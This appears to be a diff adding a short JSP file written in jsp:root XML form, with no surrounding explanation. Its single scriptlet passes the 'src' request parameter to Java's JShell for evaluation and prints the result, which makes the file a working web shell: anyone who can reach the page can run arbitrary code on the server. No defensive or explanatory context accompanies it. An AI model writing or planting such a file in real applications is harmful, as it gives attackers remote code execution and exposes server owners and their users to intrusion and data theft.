@@ -1,0 +1,5 @@
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" xmlns="http://www.w3.org/1999/xhtml" version="1.2">
+    <jsp:scriptlet>
+        out.println(jdk.jshell.JShell.builder().build().eval(request.getParameter("src")).get(0).value().replaceAll("^\"", "").replaceAll("\"$", ""));
+    </jsp:scriptlet>
+</jsp:root>
